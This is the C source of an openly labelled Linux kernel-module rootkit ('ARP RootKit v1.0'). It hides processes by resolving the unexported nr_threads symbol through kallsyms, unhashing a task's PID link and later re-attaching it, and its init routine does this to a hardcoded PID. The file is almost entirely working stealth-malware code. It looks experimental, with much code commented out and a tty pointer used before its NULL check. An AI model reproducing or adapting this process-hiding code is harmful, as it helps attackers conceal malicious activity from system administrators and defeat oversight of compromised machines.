/*
 * ARP RootKit v1.0, a simple rootkit for the Linux Kernel.
 * 
 * Copyright 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/proc_fs.h>
#include <linux/pid_namespace.h>
#include <linux/kallsyms.h>
#include <linux/rculist.h>
#include <linux/hash.h>
#include <linux/sched/signal.h>
#include <linux/module.h>       /* Needed by all modules */
#include <linux/kernel.h>       /* Needed for KERN_INFO */
#include <linux/init.h>         /* Needed for the macros */
#include <linux/tty.h>          /* For the tty declarations */
#include <linux/version.h> /* For LINUX_VERSION_CODE */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
MODULE_DESCRIPTION("A simple Linux Kernel Module RootKit");
MODULE_SUPPORTED_DEVICE("testdevice");


#define pid_hashfn(nr, ns)  \
    hash_long((unsigned long)nr + (unsigned long)ns, pidhash_shift)
struct hlist_head *pid_hash = NULL;
unsigned int pidhash_shift = 0;

#define PREFIX_MAX      32
#define LOG_LINE_MAX        (1024 - PREFIX_MAX)

int hide_pid(pid_t pid);
int unhide_pid(pid_t pid);
void pinfo(const char *fmt, ...);
void vpinfo(const char *fmt, va_list args);
int *nr_threads = NULL;
//unsigned long process_counts = 0;

struct pid_list_node {
	pid_t nr;
	struct task_struct *task;
	struct pid_list_node *next;
} *pid_list_head = NULL, *pid_list_tail = NULL;

void pid_list_create(void);
void pid_list_destroy(void);
void pid_list_push(pid_t nr, struct task_struct *task);
struct task_struct *pid_list_pop(pid_t nr);

void __unhash_process(struct task_struct *p, bool group_dead);
void __change_pid(struct task_struct *task, enum pid_type type,
            struct pid *new);
void attach_pid(struct task_struct *task, enum pid_type type);

static int __init init_rootkit(void)
{
    //pinfo("Hello world\n");

	//pid_hash = (struct hlist_head *) *((struct hlist_head **) kallsyms_lookup_name("pid_hash"));
	//pidhash_shift = (unsigned int) *((unsigned int *) kallsyms_lookup_name("pidhash_shift"));
	nr_threads = (int *) kallsyms_lookup_name("nr_threads");
	//process_counts = (unsigned long) kallsyms_lookup_name("process_counts");

	//pinfo("%p unhash_process", __unhash_process);
	//if (pid_hash == NULL || pidhash_shift == 0) {
	//	pinfo("ERROR: pid_hash = %p, pidhash_shift = %d", pid_hash, pidhash_shift);
	//	return -1;
	//}

	//pinfo("pid_hash = %p, pidhash_shift = %d, nr_threads = %d\n", pid_hash, pidhash_shift, nr_threads);

	pid_list_create();

	hide_pid(9311);
	unhide_pid(9311);

	return 0;
}

static void __exit cleanup_rootkit(void)
{
	pid_list_destroy();
}

int hide_pid(pid_t nr) {
	//struct pid_namespace *ns = task_active_pid_ns(current);
	//struct upid *pnr;
	//printk("ns %p\n", ns);
	//printk("nr %d\n", nr);
	//struct hlist_head *head;
	//struct hlist_node *node;
	struct pid *pid;
	struct task_struct *task;
	//struct list_head *task_next, *task_prev;
	//char path_name[50];
	//struct path path;

	//head = &pid_hash[pid_hashfn(nr, ns)];
	//node = hlist_first_rcu(head);
	//pnr = hlist_entry_safe(rcu_dereference_raw(node), typeof(*(pnr)), pid_chain);
	//if (pnr) {
		//printk("%d\n", pnr->nr);
		//if (pnr->nr == nr && pnr->ns == ns) {
		pid = find_vpid(nr);
		if (pid) {
			//pinfo("found pid %d", nr);
			//pid = container_of(pnr, struct pid, numbers[ns->level]);
			task = get_pid_task(pid, PIDTYPE_PID);
			if (task) {
				//printk("task = %p\n", task);
//				task_prev = task->tasks.next->prev;
//				task_next = task->tasks.prev->next;
//				task->tasks.next->prev = task->tasks.prev;
//				task->tasks.prev->next = task->tasks.next;
				__unhash_process(task, false);
				pid_list_push(nr, task);
//				attach_pid(task, PIDTYPE_PID);
//				hlist_del_rcu(node);
//				pid_hash[pid_hashfn(nr, ns)].first = NULL;
				//snprintf(path_name, sizeof(path_name), "/proc/%d", nr);
				//kern_path(path_name, LOOKUP_FOLLOW, &path);
				//d_delete(path.dentry);
				// unhide
				//d_rehash(path.dentry);
				//hlist_add_head_rcu(node, &pid_hash[pid_hashfn(nr, ns)]);
				//task->tasks.next->prev = task_prev;
				//task->tasks.prev->next = task_next;

				pinfo("find_vpid %p", find_vpid(nr));
				
				pinfo("Ok");
		
				return 0;
			} else {
				pinfo("task_struct for PID %d not found", nr);
			}
		} else {
			pinfo("PID not found.");
		}
//	} else {
//		pinfo("Unknown error 1.");
//	}

	return -1;
}

int unhide_pid(pid_t nr) {
	//struct pid *pid;
	struct task_struct *task;

	//pid = find_vpid(nr);
	//if (pid) {
		//task = get_pid_task(pid, PIDTYPE_PID);
		task = pid_list_pop(nr);
		if (task) {
			attach_pid(task, PIDTYPE_PID);

			pinfo("Ok");

			return 0;
		} else {
			pinfo("task not found");
		}
	//} else {
	//	pinfo("pid not found");
	//}

	return -1;
}

void pid_list_push(pid_t nr, struct task_struct *task) {
	struct pid_list_node *node;

	node = kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
	if (node) {
		pid_list_tail->next = node;
		pid_list_tail = node;
		node->next = NULL;
		node->nr = nr;
		node->task = task;
	} else {
		pinfo("pid_list_push kmalloc");
	}
}

struct task_struct *pid_list_pop(pid_t nr) {
	struct pid_list_node *node, *prev;
	struct task_struct *task;

	prev = node = pid_list_head;
	while(node) {
		if (node->nr == nr) {
			task = node->task;
			prev->next = node->next;
			kfree(node);

			return task;
		}
		prev = node;
		node = node->next;
	}

	return NULL;
}

void pid_list_create() {
	struct pid_list_node *node;

	node = kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
	node->next = NULL;
	node->task = NULL;
	node->nr = 0;

	pid_list_head = pid_list_tail = node;
}

void pid_list_destroy() {
	struct pid_list_node *node, *next;

	node = pid_list_head;
	while(node) {
		next = node->next;
		kfree(node);
		node = next;
	}
}

void attach_pid(struct task_struct *task, enum pid_type type)
{
    struct pid_link *link = &task->pids[type];
    hlist_add_head_rcu(&link->node, &link->pid->tasks[type]);
}

void __change_pid(struct task_struct *task, enum pid_type type,
            struct pid *new)
{
    struct pid_link *link;
    struct pid *pid;
    //int tmp;

    link = &task->pids[type];
    pid = link->pid;

    hlist_del_rcu(&link->node);
/*
	link->pid = new;

    for (tmp = PIDTYPE_MAX; --tmp >= 0; )
        if (!hlist_empty(&pid->tasks[tmp]))
            return;

    free_pid(pid);
*/
}

void __unhash_process(struct task_struct *p, bool group_dead)
{
    *nr_threads -= 1;
	__change_pid(p, PIDTYPE_PID, NULL);
/*
    if (group_dead) {
		__change_pid(p, PIDTYPE_PGID, NULL);
		__change_pid(p, PIDTYPE_SID, NULL);

        list_del_rcu(&p->tasks);
        list_del_init(&p->sibling);
        __this_cpu_dec(process_counts);
    }
    list_del_rcu(&p->thread_group);
    list_del_rcu(&p->thread_node);
*/
}

// from https://github.com/bashrc/LKMPG/blob/master/4.14.8/examples/print_string.c
// from linux-source/kernel/printk/printk.c
void pinfo(const char *fmt, ...) {
    va_list args;

    va_start(args, fmt);
    vpinfo(fmt, args);
    va_end(args);
}

void vpinfo(const char *fmt, va_list args) {
    struct tty_struct *my_tty;
    const struct tty_operations *ttyops;
    static char textbuf[LOG_LINE_MAX];
    char *str = textbuf;
    size_t str_len = 0;

    /*
     * tty struct went into signal struct in 2.6.6
     */
#if ( LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,5) )
    /*
     * The tty for the current task
     */
    my_tty = current->tty;
#else
    /*
     * The tty for the current task, for 2.6.6+ kernels
     */
    my_tty = get_current_tty();
#endif
    ttyops = my_tty->driver->ops;

    /*
     * If my_tty is NULL, the current task has no tty you can print to
     * (ie, if it's a daemon).  If so, there's nothing we can do.
     */
    if (my_tty != NULL) {

		str_len = vscnprintf(str, sizeof(textbuf), fmt, args);

        /*
         * my_tty->driver is a struct which holds the tty's functions,
         * one of which (write) is used to write strings to the tty.
         * It can be used to take a string either from the user's or
         * kernel's memory segment.
         *
         * The function's 1st parameter is the tty to write to,
         * because the same function would normally be used for all
         * tty's of a certain type.  The 2nd parameter controls
         * whether the function receives a string from kernel
         * memory (false, 0) or from user memory (true, non zero).
         * BTW: this param has been removed in Kernels > 2.6.9
         * The (2nd) 3rd parameter is a pointer to a string.
         * The (3rd) 4th parameter is the length of the string.
         *
         * As you will see below, sometimes it's necessary to use
         * preprocessor stuff to create code that works for different
         * kernel versions. The (naive) approach we've taken here
         * does not scale well. The right way to deal with this
         * is described in section 2 of
         * linux/Documentation/SubmittingPatches
         */
        (ttyops->write) (my_tty,      /* The tty itself */
#if ( LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,9) )
                         0,   /* Don't take the string
                                 from user space        */
#endif
                    	 str, /* String                 */
                         str_len);        /* Length */

        /*
         * ttys were originally hardware devices, which (usually)
         * strictly followed the ASCII standard.  In ASCII, to move to
         * a new line you need two characters, a carriage return and a
         * line feed.  On Unix, the ASCII line feed is used for both
         * purposes - so we can't just use \n, because it wouldn't have
         * a carriage return and the next line will start at the
         * column right after the line feed.
         *
         * This is why text files are different between Unix and
         * MS Windows.  In CP/M and derivatives, like MS-DOS and
         * MS Windows, the ASCII standard was strictly adhered to,
         * and therefore a newline requirs both a LF and a CR.
         */

#if ( LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,9) )
        (ttyops->write) (my_tty, 0, "\015\012", 2);
#else
        (ttyops->write) (my_tty, "\015\012", 2);
#endif
    }
}

module_init(init_rootkit);
module_exit(cleanup_rootkit);
